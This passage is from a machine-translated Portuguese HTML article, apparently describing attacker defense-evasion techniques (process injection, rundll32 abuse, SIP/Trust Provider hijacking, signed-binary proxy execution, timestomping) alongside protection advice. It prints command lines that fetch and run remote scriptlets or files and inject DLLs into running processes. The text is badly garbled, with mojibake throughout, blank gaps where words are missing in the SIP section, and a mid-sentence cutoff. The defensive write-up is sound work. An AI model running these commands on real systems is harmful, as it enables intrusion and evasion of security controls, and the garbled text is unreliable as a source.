inherit;"><font style="vertical-align: inherit;">‚Ä¢ As inje√ß√µes de inje√ß√£o do TLS (armazenamento local de segmento) envolvem a manipula√ß√£o de ponteiros de mem√≥ria dentro de um arquivo PE execut√°vel para redirecionar o processo para c√≥digo malicioso. </font></font><br><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mac e Linux</font></font></b> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ‚Ä¢ As vari√°veis ‚Äã‚Äãdo sistema LD_RPELOAD, LD_LIBRARY_PATH (Linux), DYLIB_INSERT_LIBRARIES (macOS X) ou a interface de programa√ß√£o de aplicativos (API) dlfcn podem ser usadas para carregar dinamicamente uma biblioteca (objeto compartilhado) em um processo, que por sua vez pode ser usado para interceptar chamadas de API de processos em execu√ß√£o. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">‚Ä¢ A chamada do sistema Ptrace pode ser usada para conectar-se a um processo em execu√ß√£o e alter√°-lo enquanto estiver em execu√ß√£o.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">‚Ä¢ / proc / [pid] / mem fornece acesso √† mem√≥ria do processo e pode ser usado para ler / gravar dados arbitr√°rios; no entanto, esse m√©todo raramente √© usado devido √† complexidade de sua implementa√ß√£o. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">‚Ä¢ A captura de VDSO (objeto virtual compartilhado din√¢mico virtual) permite injetar c√≥digo durante a execu√ß√£o de bin√°rios ELF manipulando os stubs de c√≥digo do linux-vdso.so. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Programas maliciosos geralmente usam inje√ß√£o de c√≥digo em um processo para acessar os recursos do sistema, o que permite que um invasor consiga uma posi√ß√£o no sistema e execute outras altera√ß√µes no ambiente atacado. Amostras mais complexas podem executar v√°rias inje√ß√µes de processo para dificultar a detec√ß√£o. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Os m√©todos de inje√ß√£o de c√≥digo nos processos s√£o baseados no abuso de fun√ß√µes regulares do SO, um impacto direto no qual pode levar √† opera√ß√£o inst√°vel de software e produtos de seguran√ßa leg√≠timos. </font><font style="vertical-align: inherit;">Os esfor√ßos para impedir o uso de t√©cnicas de intercepta√ß√£o precisam se concentrar nos est√°gios iniciais da cadeia de ataque. </font><font style="vertical-align: inherit;">Use ferramentas para bloquear software potencialmente perigoso, como o AppLocker. </font><font style="vertical-align: inherit;">Use o Yama como uma medida preventiva contra a inje√ß√£o de c√≥digo no ptrace, limitando o uso do ptrace apenas a usu√°rios privilegiados. </font><font style="vertical-align: inherit;">Medidas de seguran√ßa adicionais podem incluir a implanta√ß√£o de m√≥dulos de seguran√ßa do kernel que fornecem controle avan√ßado de acesso e restri√ß√£o de processos. </font><font style="vertical-align: inherit;">Essas ferramentas incluem SELinux, grsecurity, AppArmor.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Acesso redundante</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows, Linux, macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Usu√°rio, Administrador, </font><i><font style="vertical-align: inherit;">Descri√ß√£o do</font></i><font style="vertical-align: inherit;"> sistema </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Os invasores podem usar simultaneamente v√°rias ferramentas de acesso remoto com diferentes protocolos de controle para diversificar os riscos de detec√ß√£o. Portanto, se uma das ferramentas de acesso remoto for detectada e bloqueada, mas a parte defensora n√£o tiver identificado todas as ferramentas do invasor, o acesso remoto √† rede atacada ainda ser√° preservado. Os invasores tamb√©m podem tentar obter acesso a contas v√°lidas de servi√ßos corporativos remotos, como VPNs, para obter acesso alternativo ao sistema no caso de bloquear as ferramentas b√°sicas de acesso remoto. O uso de um shell da web tamb√©m √© uma das maneiras de acessar remotamente uma rede atrav√©s de um servidor da web. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Monitore a presen√ßa e o bloqueio do lan√ßamento de ferramentas de acesso remoto conhecidas em sua rede (AmmyAdmin, Radmin, RemotePC, VNC etc.), use ferramentas para controlar o lan√ßamento de aplicativos e bloquear software potencialmente perigoso. </font><font style="vertical-align: inherit;">A introdu√ß√£o de sistemas IDS e IPS que detectam malware espec√≠fico usando assinaturas reduzir√° a probabilidade de um ataque bem-sucedido, mas com o tempo, os atacantes modificar√£o suas ferramentas para alterar a assinatura e, como resultado, ignorar os sistemas IDS e IPS.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Regsvcs / regasm</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Usu√°rio, Administrador </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Regsvcs e Regasm s√£o utilit√°rios de utilit√°rio do Windows usados ‚Äã‚Äãpara se registrar no sistema de montagem COM (Component Object Model) do .NET. </font><font style="vertical-align: inherit;">Ambos os arquivos s√£o assinados digitalmente pela Microsoft. </font><font style="vertical-align: inherit;">Os invasores podem usar Regsvcs e Regasm para executar a execu√ß√£o de c√≥digo de proxy quando o atributo √© o c√≥digo que deve ser executado antes de registrar ou cancelar o registro: [ComRegisterFunction] ou [ComUnregisterFunction]. </font><font style="vertical-align: inherit;">O c√≥digo com esses atributos pode ser iniciado mesmo se o processo for executado com privil√©gios insuficientes ou at√© travar na inicializa√ß√£o. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Bloqueie o Regsvcs.exe e o Regasm.exe se eles n√£o forem usados ‚Äã‚Äãno seu sistema ou rede.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rootkit</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows, Linux, macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Administrador, Sistema, raiz </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Os rootkits s√£o programas que ocultam a presen√ßa de malware, interceptando e modificando chamadas de API. </font><font style="vertical-align: inherit;">Os rootkits podem funcionar no n√≠vel do usu√°rio, no kernel do sistema operacional ou at√© mesmo no n√≠vel de um hypervisor, MBR ou firmware do sistema. </font><font style="vertical-align: inherit;">Os opositores usam rootkits para ocultar a presen√ßa de programas, arquivos, conex√µes de rede, drivers e outros componentes do sistema operacional. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> identifique e bloqueie softwares potencialmente perigosos que possam conter rootkits usando ferramentas de lista de permiss√µes de software, ferramentas antiv√≠rus ou ferramentas de prote√ß√£o integradas ao SO.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rundll32 </font></font></a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Poweliks)</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos: </font></font></i><font style="vertical-align: inherit;"></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o do</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Usu√°rio </font><i><font style="vertical-align: inherit;">: O</font></i><font style="vertical-align: inherit;"> Rundll32.exe √© um utilit√°rio de sistema para o lan√ßamento de programas localizados em bibliotecas conectadas dinamicamente; pode ser chamado para arquivo bin√°rio proxy, executar arquivos de controle do Windows (.cpl) por meio de fun√ß√µes shel32.dll n√£o documentadas - </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Control_RunDLL</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> e </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Control_RunDLLAsUser</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Clicar duas vezes no arquivo .cpl tamb√©m faz com que o Rundll32.exe seja executado. O Rundll32 tamb√©m pode ser usado para executar scripts como JavaScript: </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">javascript rundll32.exe: "\ .. \ mshtml, RunHTMLApplication"; document.write (); GetObject ("scrirpt: https [:] // www [.] Exemplo [ .] com / malicioso.sct ")"</font></font></i> <br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O m√©todo acima para usar o rundll32.exe √© detectado por um software antiv√≠rus como um v√≠rus como o Poweliks. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o: o</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ASR (Attack Surface Reduction) no EMET e o Advanced Theart Protection no Windows Defender podem bloquear o uso do Rundll32.exe para ignorar a lista de permiss√µes.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Capturando SIP e Trust Provider (SIP e Trust Provider Hijacking)</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ou </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Subvertendo a confian√ßa no Windows</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Administrador, </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o do</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Sistema </font><i><font style="vertical-align: inherit;">: Os</font></i><font style="vertical-align: inherit;"> invasores podem modificar os componentes da arquitetura para assinar e verificar a assinatura digital do c√≥digo do Windows para ignorar os meios de controlar o lan√ßamento de programas que permitem que apenas o c√≥digo assinado seja executado. Para criar, assinar e verificar a assinatura de arquivos de v√°rios formatos no Windows, </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s√£o utilizados o</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> chamado </font><i><font style="vertical-align: inherit;">SIP (Subject Interface Package)</font></i><font style="vertical-align: inherit;"> - especifica√ß√µes de software exclusivas para cada tipo de arquivo, atrav√©s das quais a intera√ß√£o entre as fun√ß√µes da API inicia a cria√ß√£o, c√°lculo e verifica√ß√£o de assinaturas e diretamente arquivos A validade da assinatura √© confirmada usando o chamado </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Trust Provider.</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- Estes s√£o componentes de software do sistema operacional que executam v√°rios procedimentos relacionados ao c√°lculo e verifica√ß√£o de assinaturas digitais. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">M√©todos de ataque populares:</font></font><br><ul><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Modifica√ß√£o das </font><i><font style="vertical-align: inherit;">chaves </font></i></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DLL</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> e </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FuncName</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> na se√ß√£o </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CryptSIPDllGetSignedDataMsg</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> : </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Cryptography \ OID \ EncodingType 0 \ CryptSIPDllGetSignedDataMsg \ [SIP_GUID]</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">√â realizado com o objetivo de substituir a biblioteca DLL que fornece a fun√ß√£o </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CryptSIPDllGetSignedDataMSG</font></font></i> ,        .           (,  Microsoft    )    SIP.          , ,  ,     ,   ,  ,     ,   . </li><li>   <i>DLL</i>  <i>FuncName</i>  : <br> <i>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData/[SIP_GUID]</i> . <br>     DLL-,   <i>CryptSIPDllVerifyIndirectData</i> ,    ,   ,  ,    ,     (True/False).  ,        c   SIP.            ,         DLL-. </li><li>   <i>DLL</i>  <i>FuncName</i>  : <br> <i>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\Providers\Trust\FinalPolicy/[Trust Provider GUID]</i> . <br>     DLL-,   FinalPolicy   Trust Provider,  ,       .    CryptSIPDllVerifyIndirectData,         DLL-. </li></ul><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">√â importante observar que o ataque descrito ao mecanismo de confian√ßa do Windows pode ser implementado usando a t√©cnica de seq√ºestro de ordem de pesquisa DLL. </font></font></i> <br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> verifique se os usu√°rios do sistema protegido n√£o podem modificar as chaves do Registro relacionadas aos componentes SIP e Trust Provider. </font><font style="vertical-align: inherit;">Considere remover SIPs desnecess√°rios e obsoletos. </font><font style="vertical-align: inherit;">Use todos os tipos de meios para bloquear o download de DLLs maliciosas, por exemplo, aquelas incorporadas ao Windows AppLocker e DeviceGuard.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Script</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows, Linux, macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos: </font></font></i><font style="vertical-align: inherit;"></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o do</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> usu√°rio </font><i><font style="vertical-align: inherit;">: Os</font></i><font style="vertical-align: inherit;"> invasores podem usar scripts para automatizar suas a√ß√µes, acelerar tarefas operacionais e, como resultado, reduzir o tempo necess√°rio para obter acesso. Algumas linguagens de script podem ser usadas para ignorar os mecanismos de monitoramento de processos, interagindo diretamente com o sistema operacional no n√≠vel da API, em vez de chamar outros programas. Os scripts podem ser incorporados nos documentos do Office como macros e depois usados ‚Äã‚Äãpara ataques de phishing. Nesse caso, os invasores esperam que o usu√°rio execute o arquivo de macro ou que o usu√°rio concorda em ativar a macro. Existem v√°rias estruturas populares para implementar scripts - Metasploit, Veil, PowerSploit.</font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dicas de seguran√ßa:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> limite o acesso a scripts como VBScript ou PowerShell. </font><font style="vertical-align: inherit;">No Windows, defina as configura√ß√µes de seguran√ßa do MS Office, ativando a exibi√ß√£o segura e a proibi√ß√£o de macro por meio do GPO. </font><font style="vertical-align: inherit;">Se forem necess√°rias macros, permita apenas a execu√ß√£o de macros confi√°veis ‚Äã‚Äãassinadas digitalmente. </font><font style="vertical-align: inherit;">Use a microssegmenta√ß√£o e a virtualiza√ß√£o de aplicativos, por exemplo, Sandboxie para Windows e Apparmor, Docker para Linux.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Execu√ß√£o de c√≥digo de proxy atrav√©s da execu√ß√£o de proxy bin√°rio assinado</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos: </font></font></i><font style="vertical-align: inherit;"></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o do</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Usu√°rio </font><i><font style="vertical-align: inherit;">:</font></i><font style="vertical-align: inherit;"> Arquivos bin√°rios assinados com certificados digitais confi√°veis ‚Äã‚Äãpodem ser executados em sistemas Windows protegidos pela verifica√ß√£o de assinatura digital. V√°rios arquivos da Microsoft assinados por padr√£o durante a instala√ß√£o do Windows podem ser usados ‚Äã‚Äãcomo proxy para o lan√ßamento de outros arquivos: </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">‚Ä¢ Mavinject.exe √© um utilit√°rio do Windows que permite que o c√≥digo seja executado. O Mavinject pode ser usado para inserir a DLL no processo em execu√ß√£o: </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"C: \ Arquivos de Programas \ Arquivos Comuns \ microsoft shared \ ClickToRun \ MavInject32.exe" [PID] / INJECTRUNNING [PATH DLL]; </font></font></i> <br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C: \ Windows \ system32 \ mavinject.exe [PID] / INJECTRUNNING [PATH DLL];</font></font></i> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">‚Ä¢ SyncAppvPublishingServer.exe - pode ser usado para executar scripts do powershell sem executar o powershell.exe. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Existem </font></font><i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">v√°rios bin√°rios mais semelhantes</font></font></a></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Muitos arquivos assinados n√£o podem ser usados ‚Äã‚Äãno seu sistema, portanto, considere bloquear a inicializa√ß√£o deles.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Execu√ß√£o de c√≥digo de proxy por meio de scripts assinados (Execu√ß√£o de Proxy de Script Assinado)</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Usu√°rios </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o: Os</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> scripts assinados com certificados confi√°veis ‚Äã‚Äãpodem ser usados ‚Äã‚Äãpara proxy de arquivos maliciosos, por exemplo, o </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PubPrn.vbs √©</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> assinado com um certificado da Microsoft e pode ser usado para executar um arquivo de um servidor remoto: </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cscript C: \ Windows \ System32 \ Printing_Admin_Scripts \ Script ru-RU \ pubprn.vbs 127.0.0.1: http [:] // 192.168.1.100/hi.png </font></font></i> <br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Esses scripts assinados podem n√£o ser necess√°rios no seu sistema; considere bloquear o lan√ßamento deles.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Embalagem de software</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O empacotamento de software envolve o uso de m√©todos de compacta√ß√£o ou criptografia pelo advers√°rio em arquivos execut√°veis, resultando em uma altera√ß√£o na soma de verifica√ß√£o do arquivo, o que evita a detec√ß√£o com base na pesquisa de assinaturas est√°ticas. A maioria dos m√©todos de descompacta√ß√£o descompacta o c√≥digo execut√°vel na mem√≥ria. Exemplos de utilit√°rios populares - os empacotadores de arquivos execut√°veis ‚Äã‚Äãs√£o MPRESS e UPS, no entanto, existem muitos outros empacotadores conhecidos. Al√©m disso, os oponentes podem criar seus pr√≥prios m√©todos de empacotamento que n√£o deixar√£o esses artefatos como empacotadores conhecidos. O empacotamento de arquivos execut√°veis ‚Äã‚Äãn√£o √© um indicador claro de malware, pois os desenvolvedores leg√≠timos de software podem usar m√©todos de empacotamento para reduzir o tamanho do pacote de distribui√ß√£o ou proteger o c√≥digo propriet√°rio. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Atualize as ferramentas de prote√ß√£o antiv√≠rus, crie assinaturas personalizadas para detec√ß√£o de malware e use m√©todos de detec√ß√£o heur√≠stica. </font><font style="vertical-align: inherit;">Identifique e bloqueie software potencialmente perigoso.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Espa√ßo ap√≥s o nome do arquivo</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Linux, macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos: </font></font></i><font style="vertical-align: inherit;"><i><font style="vertical-align: inherit;">Descri√ß√£o do</font></i><font style="vertical-align: inherit;"> usu√°rio </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Os invasores podem ocultar o verdadeiro tipo de um arquivo alterando sua extens√£o. Para certos tipos de arquivos (n√£o funciona com arquivos .app), adicionar um caractere de espa√ßo ao final do nome do arquivo mudar√° a maneira como o arquivo √© processado pelo sistema operacional. Por exemplo, se houver um arquivo execut√°vel Mach-O com o nome evil.bin, quando o usu√°rio clicar duas vezes, o sistema operacional iniciar√° o Terminal.app e o executar√°. Se o mesmo arquivo for renomeado para evil.txt, com um clique duplo, ele ser√° iniciado em um editor de texto. No entanto, se o arquivo for renomeado para "evil.txt" (espa√ßo no final), clicando duas vezes no tipo do arquivo true, o sistema operacional ser√° determinado e o arquivo bin√°rio ser√° iniciado. Os invasores podem usar essa t√©cnica para induzir um usu√°rio a iniciar um arquivo execut√°vel malicioso. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O uso dessa t√©cnica √© dif√≠cil de evitar, porque </font><font style="vertical-align: inherit;">um invasor usa mecanismos operacionais padr√£o do sistema operacional; portanto, o vetor de prote√ß√£o deve ser direcionado para impedir a√ß√µes maliciosas nos est√°gios anteriores do ataque, por exemplo, no est√°gio de entrega ou cria√ß√£o de um arquivo malicioso no sistema.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Timestomp</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows, Linux </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Usu√°rio, Administrador, </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o do</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> sistema </font><i><font style="vertical-align: inherit;">:</font></i><font style="vertical-align: inherit;"> Timestomp √© uma altera√ß√£o nos carimbos de data / hora do arquivo (altera√ß√£o, acesso, cria√ß√£o). Geralmente, os m√©todos de carimbo de data e hora s√£o usados ‚Äã‚Äãpara mascarar arquivos que foram modificados ou criados por um invasor, para que n√£o sejam percept√≠veis por especialistas forenses e ferramentas forenses. O registro de data e hora pode ser usado em conjunto com o mascaramento de nome de arquivo para ocultar ferramentas de malware e intruso. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direcione o vetor de prote√ß√£o para impedir o lan√ßamento de software potencialmente perigoso e mal-intencionado. </font><font style="vertical-align: inherit;">O forense descreve m√©todos para organizar ferramentas para detectar a modifica√ß√£o de registros de data e hora coletando informa√ß√µes sobre como abrir um descritor de arquivo e comparando-o com registros de data e hora especificados no arquivo.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Utilit√°rios de desenvolvedor confi√°veis</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos: </font></font></i><font style="vertical-align: inherit;"></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o do</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Usu√°rio </font><i><font style="vertical-align: inherit;">:</font></i><font style="vertical-align: inherit;"> Existem muitos utilit√°rios usados ‚Äã‚Äãpor desenvolvedores de software e que podem ser usados ‚Äã‚Äãpara executar c√≥digo de v√°rias formas no desenvolvimento, depura√ß√£o e engenharia reversa de software. Esses utilit√°rios geralmente s√£o assinados com certificados digitais que permitem 